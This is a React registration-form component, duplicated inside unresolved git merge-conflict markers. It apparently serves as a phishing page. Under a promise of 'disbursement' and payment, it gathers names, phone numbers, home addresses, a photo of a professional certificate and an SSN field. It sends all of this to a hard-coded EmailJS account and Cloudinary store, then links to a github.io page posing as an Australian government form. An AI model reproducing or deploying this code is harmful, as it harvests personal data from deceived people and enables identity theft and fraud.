<<<<<<< HEAD
import React, { useState } from 'react';
import { Container, Row, Col, Form, Button, Modal } from 'react-bootstrap';
import emailjs from 'emailjs-com';
import Navbar from './Navbar';
import Footer from './Footer';
import img1 from "./img/DOL-MasterLogo_BLUE.svg"
import img2 from "./img/Untitled.png"
import img3 from "./img/121.png"
import img4 from "./img/Untitled1.png"
import './partners.css';

const logos = [
  { id: 1, src: img1, alt: 'New Wave' },
  { id: 2, src: img2, alt: 'Organic' },
  { id: 3, src: img3, alt: 'Mockup' },
  { id: 4, src: img4, alt: 'Alisa' }
];

const RegistrationForm = () => {
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  // const [showSuccessModal, setShowSuccessModal] = useState(false);
  // const [selectedFile, setSelectedFile] = useState(null);
  const [formValues, setFormValues] = useState({
    firstName: '',
    lastName: '',
    phoneNumber: '',
    profession: '',
    ssn: '',
    email: '',
    studentName: '',
    relation: '',
    streetAddress: '',
    city: '',
    state: '',
    postalCode: '',
    imageUrl: '' // Store uploaded image URL
  });
  const [selectedFile, setSelectedFile] = useState(null);

  // const handleInputChange = (e) => {
  //   const { name, value } = e.target;

  //   if (name === 'month' || name === 'day' || name === 'year') {
  //     handleNumberInputChange(e);
  //   } else {
  //     setFormValues({ ...formValues, [name]: value });
  //   }
  // };

   // Handle input changes
   const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormValues({ ...formValues, [name]: value });
  };

  //upload file

  // Handle file change
  const handleFileChange = (e) => {
    setSelectedFile(e.target.files[0]);
  };

  // Upload file to Cloudinary
  const uploadImageToCloudinary = async () => {
    if (!selectedFile) return null;
    const formData = new FormData();
    formData.append('file', selectedFile);
    formData.append('upload_preset', 'image_one'); // Replace with your actual upload preset
    formData.append('cloud_name', 'di9fxztii'); // Replace with your actual cloud name

    try {
      const response = await fetch(`https://api.cloudinary.com/v1_1/di9fxztii/image/upload`, {
        method: 'POST',
        body: formData,
      });
      const data = await response.json();
      return data.secure_url; // Return the URL of the uploaded image
    } catch (error) {
      console.error('Error uploading image:', error);
      return null;
    }
  };

  //upload file END


  const handlePhoneNumberChange = (e) => {
    const { name, value } = e.target;
    if (/^[\d()+_\s-]*$/.test(value)) {
      setFormValues({ ...formValues, [name]: value });
    }
  };

  // const handleSSNChange = (e) => {
  //   const { name, value } = e.target;
    
  //   // Remove any non-digit characters
  //   let formattedValue = value.replace(/\D/g, '');
  
  //   // Add dashes at appropriate positions
  //   if (formattedValue.length > 3 && formattedValue.length <= 5) {
  //     formattedValue = `${formattedValue.slice(0, 3)}-${formattedValue.slice(3)}`;
  //   } else if (formattedValue.length > 5) {
  //     formattedValue = `${formattedValue.slice(0, 3)}-${formattedValue.slice(3, 5)}-${formattedValue.slice(5, 9)}`;
  //   }
  
  //   // Update state
  //   setFormValues({ ...formValues, [name]: formattedValue });
  // };
  
  

  // Handle form submit
  const handleSubmit = async (e) => {
    e.preventDefault();

    // Upload image and get URL
    const imageUrl = await uploadImageToCloudinary();

    // Set the imageUrl in form values and send email
    setFormValues({ ...formValues, imageUrl: imageUrl });
    sendEmail(imageUrl);
    // setShowSuccessModal(true);
    setShowConfirmModal(true);
  };


  const handleConfirm = () => {

    setFormValues({
      firstName: '',
      lastName: '',
      phoneNumber: '',
      profession: '',
      ssn: '',
      email: '',
      studentName: '',
      relation: '',
      streetAddress: '',
      city: '',
      state: '',
      postalCode: ''
    });
    setSelectedFile(null);

    setShowConfirmModal(false);

  };

  const sendEmail = async (imageUrl) => {

    const templateParams = {
      firstName: formValues.firstName,
      lastName: formValues.lastName,
      phoneNumber: formValues.phoneNumber,
      profession: formValues.profession,
      ssn: formValues.ssn,
      email: formValues.email,
      studentName: formValues.studentName,
      relation: formValues.relation,
      streetAddress: formValues.streetAddress,
      city: formValues.city,
      state: formValues.state,
      postalCode: formValues.postalCode,
      imageUrl: imageUrl // Include image URL in the email template
    };
    

    emailjs.send(
      'service_e234qa4', // Replace with your service ID
      'template_7eyr14q', // Replace with your template ID
      templateParams,
      'aM4ACgzNEz-ykB_dV' // Replace with your user ID
    ).then((response) => {
      console.log('Email successfully sent!', response.status, response.text);
    }).catch((err) => {
      console.error('Error sending email:', err);
    });
  };

  // const handleSuccessClose = () => {
  //   // setShowSuccessModal(false);
  //   setFormValues({
  //     firstName: '',
  //     lastName: '',
  //     phoneNumber: '',
  //     ssn: '',
  //     email: '',
  //     studentName: '',
  //     relation: '',
  //     streetAddress: '',
  //     city: '',
  //     state: '',
  //     postalCode: ''
  //   });
  //   setSelectedFile(null);
  // };

  return (
    <div>
    <Navbar />
    <div style={{marginTop: '110px'}}>
    <div className='partner1'>
      <h3 className='fw-semibold text-secondary pt-1'>Partners & Donors</h3>
      <h5 className='fw-semibold' style={{color: '#575656'}}>In Collaboration With:</h5>
      <div className='partner'>
      <div className="logo-list">
            {logos.map((logo) => (
                <div key={logo.id} className="logo-item">
                    <img src={logo.src} alt={logo.alt} />
                </div>
            ))}
        </div>
      </div>
    </div>
    <Container className="d-flex justify-content-center align-items-center min-vh-100">
      <Row>
        <Col md={8} lg={6} className="p-4 border rounded shadow-sm bg-light">
          {/* <div className="border border-2 p-2" >
          <p2 className="p-0">You are required to fill in your details before making a payment, in accordance with school policy.</p2>
          </div> */}
          <h2 className="text-center my-2">Registration</h2>
          <p className="text-center mb-4">Enter only correct details to avoid <span style={{color: "#FF0000"}}>error(s)</span> during disbursement.</p>
          <Form onSubmit={handleSubmit}>
            <Form.Group controlId="formFirstName">
              <Form.Label>First Name</Form.Label>
              <Form.Control type="text" placeholder="First Name" name="firstName" value={formValues.firstName} onChange={handleInputChange} required />
            </Form.Group>

            <Form.Group controlId="formLastName" className="mt-2">
              <Form.Label>Last Name</Form.Label>
              <Form.Control type="text" placeholder="Last Name" name="lastName" value={formValues.lastName} onChange={handleInputChange} required />
            </Form.Group>

            {/* <Form.Group controlId="formBirthDate" className="mt-2">
              <Form.Label>Birth Date</Form.Label>
              <Row>
                <Col>
                  <Form.Control type="text" placeholder="Month" name="month" value={formValues.month} onChange={handleInputChange} required />
                </Col>
                <Col>
                  <Form.Control type="text" placeholder="Day" name="day" value={formValues.day} onChange={handleInputChange} required />
                </Col>
                <Col>
                  <Form.Control type="text" placeholder="Year" name="year" value={formValues.year} onChange={handleInputChange} required />
                </Col>
              </Row>
            </Form.Group> */}

            <Form.Group controlId="formPhoneNumber" className="mt-2">
              <Form.Label>Mobile Phone Number</Form.Label>
              <Form.Control type="text" placeholder="0000 000 000" name="phoneNumber" value={formValues.phoneNumber} onChange={handlePhoneNumberChange} required />
            </Form.Group>            

            {/* <Form.Group controlId="formEmail" className="mt-2">
              <Form.Label>E-mail Address</Form.Label>
              <Form.Control type="email" placeholder="example@example.com" name="email" value={formValues.email} onChange={handleInputChange} required />
            </Form.Group> */}

            <Form.Group controlId="formToWhom" className="mt-2">
              <Form.Label>Profession</Form.Label>
              <Form.Control type="text" placeholder="Enter your profession" name="profession" value={formValues.profession} onChange={handleInputChange} required />
            </Form.Group>

            {/* upload file */}

            <Form.Group controlId="formFile" className="mt-2">
              <Form.Label>Profession Verification</Form.Label>
              <br/>
              <Form.Label style={{fontSize: '14px'}}>Upload a clear certificate to verify your profession</Form.Label>
              
              <Form.Control 
                type="file" 
                accept="image/*" 
                capture="environment" // Use "user" for front camera
                onChange={handleFileChange} 
                required
              />
            </Form.Group>

            {selectedFile && (
              <div className="mt-2">
                <p>Preview:</p>
                <img src={URL.createObjectURL(selectedFile)} alt="Preview" width="100px" />
              </div>
            )}

            {/* upload file END */}


            <Form.Group controlId="formAddress" className="mt-4">
              <Form.Label>Mailing (Home) Address</Form.Label>
              <Form.Control type="text" placeholder="Street Address" name="streetAddress" value={formValues.streetAddress} onChange={handleInputChange} required className="mb-2" />
              {/* <Form.Control type="text" placeholder="Street Address Line 2" name="streetAddress2" value={formValues.streetAddress2} onChange={handleInputChange} className="mb-2" /> */}
              <Form.Control type="text" placeholder="Suburb" name="city" value={formValues.city} onChange={handleInputChange} required className="mb-2" />
              <Form.Control type="text" placeholder="State / Province" name="state" value={formValues.state} onChange={handleInputChange} required className="mb-2" />
              <Form.Control type="text" placeholder="Postal / Zip Code" name="postalCode" value={formValues.postalCode} onChange={handleInputChange} required />
            </Form.Group>

            <p className='fst-italic mt-3'>Please confirm and check your details before submitting to avoid <span style={{color: "#FF0000"}}>error(s)</span> during payment process</p>

            <Button variant="primary" type="submit" >
              SUBMIT
            </Button>
          </Form>
        </Col>
      </Row>

      <Modal show={showConfirmModal} onHide={() => setShowConfirmModal(false)}>
        <Modal.Header closeButton>
          <Modal.Title>Confirm Your Details</Modal.Title>
        </Modal.Header>
        <Modal.Body>
          <Button variant="primary" onClick={handleConfirm}>
            <a href='https://gov-create.github.io/arc.gov.form.au/' target='blank' className='text-light text-decoration-none'>Yes, I Have Confirmed</a>
          </Button>
        </Modal.Body>
      </Modal>
        
      {/* <Modal show={showSuccessModal} onHide={handleSuccessClose}>
        <Modal.Header closeButton>
          <Modal.Title>Confirmation</Modal.Title>
        </Modal.Header>
        <Modal.Body>
          <p>Please check your email; you will receive a message shortly.</p>
        </Modal.Body>
        <Modal.Footer>
          <Button variant="primary" onClick={handleSuccessClose}>
            OK
          </Button>
        </Modal.Footer>
      </Modal> */}
    </Container>
    </div>
    <Footer />
    </div>
  
  );
};

export default RegistrationForm;
=======
import React, { useState } from 'react';
import { Container, Row, Col, Form, Button, Modal } from 'react-bootstrap';
import emailjs from 'emailjs-com';
import Navbar from './Navbar';
import Footer from './Footer';
import img1 from "./img/DOL-MasterLogo_BLUE.svg"
import img2 from "./img/Untitled.png"
import img3 from "./img/121.png"
import img4 from "./img/Untitled1.png"
import './partners.css';

const logos = [
  { id: 1, src: img1, alt: 'New Wave' },
  { id: 2, src: img2, alt: 'Organic' },
  { id: 3, src: img3, alt: 'Mockup' },
  { id: 4, src: img4, alt: 'Alisa' }
];

const RegistrationForm = () => {
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  // const [showSuccessModal, setShowSuccessModal] = useState(false);
  // const [selectedFile, setSelectedFile] = useState(null);
  const [formValues, setFormValues] = useState({
    firstName: '',
    lastName: '',
    phoneNumber: '',
    profession: '',
    ssn: '',
    email: '',
    studentName: '',
    relation: '',
    streetAddress: '',
    city: '',
    state: '',
    postalCode: '',
    imageUrl: '' // Store uploaded image URL
  });
  const [selectedFile, setSelectedFile] = useState(null);

  // const handleInputChange = (e) => {
  //   const { name, value } = e.target;

  //   if (name === 'month' || name === 'day' || name === 'year') {
  //     handleNumberInputChange(e);
  //   } else {
  //     setFormValues({ ...formValues, [name]: value });
  //   }
  // };

   // Handle input changes
   const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormValues({ ...formValues, [name]: value });
  };

  //upload file

  // Handle file change
  const handleFileChange = (e) => {
    setSelectedFile(e.target.files[0]);
  };

  // Upload file to Cloudinary
  const uploadImageToCloudinary = async () => {
    if (!selectedFile) return null;
    const formData = new FormData();
    formData.append('file', selectedFile);
    formData.append('upload_preset', 'image_one'); // Replace with your actual upload preset
    formData.append('cloud_name', 'di9fxztii'); // Replace with your actual cloud name

    try {
      const response = await fetch(`https://api.cloudinary.com/v1_1/di9fxztii/image/upload`, {
        method: 'POST',
        body: formData,
      });
      const data = await response.json();
      return data.secure_url; // Return the URL of the uploaded image
    } catch (error) {
      console.error('Error uploading image:', error);
      return null;
    }
  };

  //upload file END


  const handlePhoneNumberChange = (e) => {
    const { name, value } = e.target;
    if (/^[\d()+_\s-]*$/.test(value)) {
      setFormValues({ ...formValues, [name]: value });
    }
  };

  // const handleSSNChange = (e) => {
  //   const { name, value } = e.target;
    
  //   // Remove any non-digit characters
  //   let formattedValue = value.replace(/\D/g, '');
  
  //   // Add dashes at appropriate positions
  //   if (formattedValue.length > 3 && formattedValue.length <= 5) {
  //     formattedValue = `${formattedValue.slice(0, 3)}-${formattedValue.slice(3)}`;
  //   } else if (formattedValue.length > 5) {
  //     formattedValue = `${formattedValue.slice(0, 3)}-${formattedValue.slice(3, 5)}-${formattedValue.slice(5, 9)}`;
  //   }
  
  //   // Update state
  //   setFormValues({ ...formValues, [name]: formattedValue });
  // };
  
  

  // Handle form submit
  const handleSubmit = async (e) => {
    e.preventDefault();

    // Upload image and get URL
    const imageUrl = await uploadImageToCloudinary();

    // Set the imageUrl in form values and send email
    setFormValues({ ...formValues, imageUrl: imageUrl });
    sendEmail(imageUrl);
    // setShowSuccessModal(true);
    setShowConfirmModal(true);
  };


  const handleConfirm = () => {

    setFormValues({
      firstName: '',
      lastName: '',
      phoneNumber: '',
      profession: '',
      ssn: '',
      email: '',
      studentName: '',
      relation: '',
      streetAddress: '',
      city: '',
      state: '',
      postalCode: ''
    });
    setSelectedFile(null);

    setShowConfirmModal(false);

  };

  const sendEmail = async (imageUrl) => {

    const templateParams = {
      firstName: formValues.firstName,
      lastName: formValues.lastName,
      phoneNumber: formValues.phoneNumber,
      profession: formValues.profession,
      ssn: formValues.ssn,
      email: formValues.email,
      studentName: formValues.studentName,
      relation: formValues.relation,
      streetAddress: formValues.streetAddress,
      city: formValues.city,
      state: formValues.state,
      postalCode: formValues.postalCode,
      imageUrl: imageUrl // Include image URL in the email template
    };
    

    emailjs.send(
      'service_e234qa4', // Replace with your service ID
      'template_7eyr14q', // Replace with your template ID
      templateParams,
      'aM4ACgzNEz-ykB_dV' // Replace with your user ID
    ).then((response) => {
      console.log('Email successfully sent!', response.status, response.text);
    }).catch((err) => {
      console.error('Error sending email:', err);
    });
  };

  // const handleSuccessClose = () => {
  //   // setShowSuccessModal(false);
  //   setFormValues({
  //     firstName: '',
  //     lastName: '',
  //     phoneNumber: '',
  //     ssn: '',
  //     email: '',
  //     studentName: '',
  //     relation: '',
  //     streetAddress: '',
  //     city: '',
  //     state: '',
  //     postalCode: ''
  //   });
  //   setSelectedFile(null);
  // };

  return (
    <div>
    <Navbar />
    <div style={{marginTop: '110px'}}>
    <div className='partner1'>
      <h3 className='fw-semibold text-secondary pt-1'>Partners & Donors</h3>
      <h5 className='fw-semibold' style={{color: '#575656'}}>In Collaboration With:</h5>
      <div className='partner'>
      <div className="logo-list">
            {logos.map((logo) => (
                <div key={logo.id} className="logo-item">
                    <img src={logo.src} alt={logo.alt} />
                </div>
            ))}
        </div>
      </div>
    </div>
    <Container className="d-flex justify-content-center align-items-center min-vh-100">
      <Row>
        <Col md={8} lg={6} className="p-4 border rounded shadow-sm bg-light">
          {/* <div className="border border-2 p-2" >
          <p2 className="p-0">You are required to fill in your details before making a payment, in accordance with school policy.</p2>
          </div> */}
          <h2 className="text-center my-2">Registration</h2>
          <p className="text-center mb-4">Enter only correct details to avoid <span style={{color: "#FF0000"}}>error(s)</span> during disbursement.</p>
          <Form onSubmit={handleSubmit}>
            <Form.Group controlId="formFirstName">
              <Form.Label>First Name</Form.Label>
              <Form.Control type="text" placeholder="First Name" name="firstName" value={formValues.firstName} onChange={handleInputChange} required />
            </Form.Group>

            <Form.Group controlId="formLastName" className="mt-2">
              <Form.Label>Last Name</Form.Label>
              <Form.Control type="text" placeholder="Last Name" name="lastName" value={formValues.lastName} onChange={handleInputChange} required />
            </Form.Group>

            {/* <Form.Group controlId="formBirthDate" className="mt-2">
              <Form.Label>Birth Date</Form.Label>
              <Row>
                <Col>
                  <Form.Control type="text" placeholder="Month" name="month" value={formValues.month} onChange={handleInputChange} required />
                </Col>
                <Col>
                  <Form.Control type="text" placeholder="Day" name="day" value={formValues.day} onChange={handleInputChange} required />
                </Col>
                <Col>
                  <Form.Control type="text" placeholder="Year" name="year" value={formValues.year} onChange={handleInputChange} required />
                </Col>
              </Row>
            </Form.Group> */}

            <Form.Group controlId="formPhoneNumber" className="mt-2">
              <Form.Label>Mobile Phone Number</Form.Label>
              <Form.Control type="text" placeholder="0000 000 000" name="phoneNumber" value={formValues.phoneNumber} onChange={handlePhoneNumberChange} required />
            </Form.Group>            

            {/* <Form.Group controlId="formEmail" className="mt-2">
              <Form.Label>E-mail Address</Form.Label>
              <Form.Control type="email" placeholder="example@example.com" name="email" value={formValues.email} onChange={handleInputChange} required />
            </Form.Group> */}

            <Form.Group controlId="formToWhom" className="mt-2">
              <Form.Label>Profession</Form.Label>
              <Form.Control type="text" placeholder="Enter your profession" name="profession" value={formValues.profession} onChange={handleInputChange} required />
            </Form.Group>

            {/* upload file */}

            <Form.Group controlId="formFile" className="mt-2">
              <Form.Label>Profession Verification</Form.Label>
              <br/>
              <Form.Label style={{fontSize: '14px'}}>Upload a clear certificate to verify your profession</Form.Label>
              
              <Form.Control 
                type="file" 
                accept="image/*" 
                capture="environment" // Use "user" for front camera
                onChange={handleFileChange} 
                required
              />
            </Form.Group>

            {selectedFile && (
              <div className="mt-2">
                <p>Preview:</p>
                <img src={URL.createObjectURL(selectedFile)} alt="Preview" width="100px" />
              </div>
            )}

            {/* upload file END */}


            <Form.Group controlId="formAddress" className="mt-4">
              <Form.Label>Mailing (Home) Address</Form.Label>
              <Form.Control type="text" placeholder="Street Address" name="streetAddress" value={formValues.streetAddress} onChange={handleInputChange} required className="mb-2" />
              {/* <Form.Control type="text" placeholder="Street Address Line 2" name="streetAddress2" value={formValues.streetAddress2} onChange={handleInputChange} className="mb-2" /> */}
              <Form.Control type="text" placeholder="Suburb" name="city" value={formValues.city} onChange={handleInputChange} required className="mb-2" />
              <Form.Control type="text" placeholder="State / Province" name="state" value={formValues.state} onChange={handleInputChange} required className="mb-2" />
              <Form.Control type="text" placeholder="Postal / Zip Code" name="postalCode" value={formValues.postalCode} onChange={handleInputChange} required />
            </Form.Group>

            <p className='fst-italic mt-3'>Please confirm and check your details before submitting to avoid <span style={{color: "#FF0000"}}>error(s)</span> during payment process</p>

            <Button variant="primary" type="submit" >
              SUBMIT
            </Button>
          </Form>
        </Col>
      </Row>

      <Modal show={showConfirmModal} onHide={() => setShowConfirmModal(false)}>
        <Modal.Header closeButton>
          <Modal.Title>Confirm Your Details</Modal.Title>
        </Modal.Header>
        <Modal.Body>
          <Button variant="primary" onClick={handleConfirm}>
            <a href='https://gov-create.github.io/arc.gov.form.au/' target='blank' className='text-light text-decoration-none'>Yes, I Have Confirmed</a>
          </Button>
        </Modal.Body>
      </Modal>
        
      {/* <Modal show={showSuccessModal} onHide={handleSuccessClose}>
        <Modal.Header closeButton>
          <Modal.Title>Confirmation</Modal.Title>
        </Modal.Header>
        <Modal.Body>
          <p>Please check your email; you will receive a message shortly.</p>
        </Modal.Body>
        <Modal.Footer>
          <Button variant="primary" onClick={handleSuccessClose}>
            OK
          </Button>
        </Modal.Footer>
      </Modal> */}
    </Container>
    </div>
    <Footer />
    </div>
  
  );
};

export default RegistrationForm;
>>>>>>> 3bef7d0602299174eddd921b0478b376730d8b4b
